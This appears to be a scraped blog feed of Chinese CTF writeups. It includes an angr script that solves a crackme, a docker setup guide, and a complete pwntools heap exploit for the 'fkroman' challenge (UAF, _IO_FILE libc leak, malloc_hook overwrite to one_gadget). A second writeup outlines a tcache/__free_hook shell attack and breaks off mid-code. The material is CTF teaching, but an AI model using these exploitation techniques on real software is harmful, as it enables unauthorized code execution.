class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)verify((__int64)argv[<span class="number">1</span>]) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Correct! that is the secret key!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"I'm sorry, that's the wrong secret key!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need to enter the secret key!"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序流程还是和上一题很相似，只是需要我们输入正确的参数从而得到flag，加密函数如下，我们同样不需要分析它<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">verify</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( encrypted[i] != ((<span class="keyword">unsigned</span> __int8)((<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &lt;&lt; ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)) | (<span class="keyword">unsigned</span> __int8)((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &gt;&gt; (<span class="number">8</span> - ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>))))</span><br><span class="line">                       + <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i == <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>符号执行脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy  <span class="comment">#处理用户输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    project = angr.Project(<span class="string">"./ais3_crackme"</span>)</span><br><span class="line"></span><br><span class="line">    argv1 = claripy.BVS(<span class="string">"argv1"</span>,<span class="number">100</span>*<span class="number">8</span>) <span class="comment">#猜测flag长度小于100,乘8是转换为字节</span></span><br><span class="line">    initial_state = project.factory.entry_state(args=[<span class="string">"./crackme1"</span>,argv1]) <span class="comment"># 传递参数</span></span><br><span class="line"></span><br><span class="line">    sm = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#象征性地执行程序，直到达到指令指针的要求值</span></span><br><span class="line">    sm.explore(find=<span class="number">0x400602</span>) <span class="comment">#在这个指令程序将打印“正确的”消息</span></span><br><span class="line"></span><br><span class="line">    found = sm.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#请求符号解算程序以字符串的形式获取处于到达状态的argv1的值</span></span><br><span class="line">    solution = found.solver.eval(argv1, cast_to=str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(solution)</span><br><span class="line">    solution = solution[:solution.find(<span class="string">"\x00"</span>)]</span><br><span class="line">    <span class="keyword">print</span> solution</span><br><span class="line">    <span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    res = main()</span><br><span class="line">    <span class="keyword">assert</span> res == <span class="string">"ais3&#123;I_tak3_g00d_n0t3s&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(repr(main()))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>docker安装angr</title>
    <link href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/"/>
    <id>https://nocbtm.github.io/2019/10/02/docker安装angr/</id>
    <published>2019-10-02T07:48:56.000Z</published>
    <updated>2019-10-03T04:24:29.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环境为ubuntu16.64。</p><h2 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h2><p>申请<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a>，修改daemon配置文件/etc/docker/daemon.json来使用加速器，把下方的registry-mirrors换成你的加速器地址。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://culfukli.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></p><h2 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br></pre></td></tr></table></figure><p>安装完执行docker images 查看镜像，运行angr<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br></pre></td></tr></table></figure></p><p>上述命令可以执行angr，但不会保存你在其中做的修改，应该用下列命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> run -itd registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br><span class="line">1d443841326281a8c5aee9cfad74893a5eded421eadc3eac2222f91bf15e3eb9</span><br><span class="line"><span class="variable">$docker</span> <span class="built_in">exec</span> -it 1d44 bash     <span class="comment">#1d44为你的id的前四位</span></span><br><span class="line">root@1d4438413262:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure></p><p>这时可以输入命令了，与在linux中操作一样。<br>但在root用户下import angr会失败，用su angr命令切换到angr用户即可。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>进入到有例子的目录下，执行脚本,可以看到flag。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> /home/angr/angr-dev/angr-doc/examples/ais3_crackme</span><br><span class="line"><span class="variable">$ls</span></span><br><span class="line">ais3_crackme  solve.py</span><br><span class="line"><span class="variable">$python</span> solve.py </span><br><span class="line"><span class="string">'ais3&#123;I_tak3_g00d_n0t3s&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">ais3&#123;I_tak3_g00d_n0t3s&#125;</span><br><span class="line"><span class="string">'ais3&#123;I_tak3_g00d_n0t3s&#125;'</span></span><br></pre></td></tr></table></figure></p><h2 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h2><p>主机向docker中拷贝：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp (本地文件路径) (docker container id):(容器中路径)</span><br></pre></td></tr></table></figure></p><p>docker向主机中拷贝：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp (docker container id):(容器中路径) (本地文件路径)</span><br></pre></td></tr></table></figure></p><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><h3 id="查看容器进程"><a href="#查看容器进程" class="headerlink" title="查看容器进程"></a>查看容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h3 id="打开容器"><a href="#打开容器" class="headerlink" title="打开容器"></a>打开容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start container_id</span><br></pre></td></tr></table></figure><h3 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockr stop container_id</span><br></pre></td></tr></table></figure><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id</span><br></pre></td></tr></table></figure><h3 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">export</span> container_id &gt; 容器快照名</span><br></pre></td></tr></table></figure><h2 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h3 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名称</span><br></pre></td></tr></table></figure><h3 id="运行images"><a href="#运行images" class="headerlink" title="运行images"></a>运行images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it 镜像名称 bash</span><br></pre></td></tr></table></figure><h3 id="删除images"><a href="#删除images" class="headerlink" title="删除images"></a>删除images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>学习pwn的心理路程</title>
    <link href="https://nocbtm.github.io/2019/10/02/%E5%AD%A6%E4%B9%A0pwn%E7%9A%84%E5%BF%83%E7%90%86%E8%B7%AF%E7%A8%8B/"/>
    <id>https://nocbtm.github.io/2019/10/02/学习pwn的心理路程/</id>
    <published>2019-10-02T04:21:32.000Z</published>
    <updated>2019-10-02T10:57:24.281Z</updated>
    
    <content type="html"><![CDATA[<p>(o≖◡≖)<br>(๑•̀ㅂ•́)و✧<br>(*￣ω￣)<br>w(ﾟДﾟ)w<br>o(≧口≦)o<br>Σ( ° △ °|||)︴    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;(o≖◡≖)&lt;br&gt;(๑•̀ㅂ•́)و✧&lt;br&gt;(*￣ω￣)&lt;br&gt;w(ﾟДﾟ)w&lt;br&gt;o(≧口≦)o&lt;br&gt;Σ( ° △ °|||)︴    &lt;/p&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="https://nocbtm.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数字经济 pwn fkroman writeup</title>
    <link href="https://nocbtm.github.io/2019/09/28/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20fkroman%20writeup/"/>
    <id>https://nocbtm.github.io/2019/09/28/数字经济 pwn fkroman writeup/</id>
    <published>2019-09-28T09:20:42.000Z</published>
    <updated>2019-10-04T06:16:27.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址</li><li>再用uaf漏洞劫持malloc_hook为one_gadget</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>本地环境：ubuntu 16.04，成功率不高<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./fkroman'</span></span><br><span class="line">lib = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'121.40.246.48'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Your choice: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    index(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">iofile_off = [<span class="number">0x25dd</span>,<span class="number">0xf5eb</span>] <span class="comment">#_IO_2_1_stderr_+157</span></span><br><span class="line">libc_off = <span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x90</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span><span class="number">-8</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#-------------------leak libc---------------------</span></span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">1</span>, p8(<span class="number">0xe0</span>))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">'A'</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">2</span>, p16(iofile_off[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#target</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x54</span>, <span class="string">'A'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x00000000fbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.recv(<span class="number">0x40</span>)</span><br><span class="line">    recv_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'libc-&gt;'</span>+hex(recv_addr))</span><br><span class="line">    pause()</span><br><span class="line">    libc.address = recv_addr - libc_off</span><br><span class="line">    log.info(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------malloc_hook-------------------</span></span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">'B'</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    dele(<span class="number">7</span>)</span><br><span class="line">    info(hex(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">8</span>, p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#0x7fefcf441aed _IO_wide_data_0+301</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#target2</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    info(hex(libc.address+onegadgets[<span class="number">1</span>]))</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">9</span>, <span class="number">0x1b</span>, <span class="string">'C'</span>*<span class="number">0x13</span>+p64(libc.address+onegadgets[<span class="number">1</span>])) <span class="comment">#0x7fefcf0c226a</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">10</span>, <span class="number">0</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> LOCAL:</span><br><span class="line">                io = elf.process()</span><br><span class="line">                env=&#123;<span class="string">"LD_PRELOAD"</span>: libc.path&#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io = remote(ip, port)</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure></p><p>参考文章:<br><a href="https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址&lt;/li&gt;
&lt;li&gt;再用uaf漏洞劫持malloc_hoo
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数字经济 pwn amazon writeup</title>
    <link href="https://nocbtm.github.io/2019/09/25/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20amazon%20writeup/"/>
    <id>https://nocbtm.github.io/2019/09/25/数字经济 pwn amazon writeup/</id>
    <published>2019-09-25T09:20:42.000Z</published>
    <updated>2019-10-04T06:16:25.258Z</updated>
    
    <content type="html"><![CDATA[<p>本地环境：ubuntu 18.04</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1、利用glibc-2.27的tcache机制连续释放八次unsortedbin，再输出，可以leak出libc的基址<br>2、利用unsortedbin的合并，overlap修改tcache表的fd位为_free_hook的地址<br>3、提前把”$0\x00”(/bin/sh)写入到堆块中<br>4、申请堆块到_free_hook附近，修改__free_hook为system,<br>5、释放堆块，得到shell</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>本地环境：ubuntu 18.04</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 